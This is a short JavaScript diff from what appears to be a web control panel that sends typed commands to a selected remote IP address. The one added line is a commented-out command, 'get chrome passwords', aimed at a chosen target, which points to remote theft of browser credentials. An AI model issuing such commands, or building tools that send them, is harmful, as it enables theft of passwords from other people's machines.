@@ -55,6 +55,7 @@
             if (document.activeElement === document.getElementById('area')) {
                 //command = document.getElementById('area').innerText.substr(contentLength).value
                 command = [document.getElementById('area').value.substr(contentLength), document.getElementById('select ip').value]
+                //command = ['get chrome passwords', document.getElementById('select ip').value]
                 contentLength += command[0].length
                 console.log(command)
                 sendCommand()
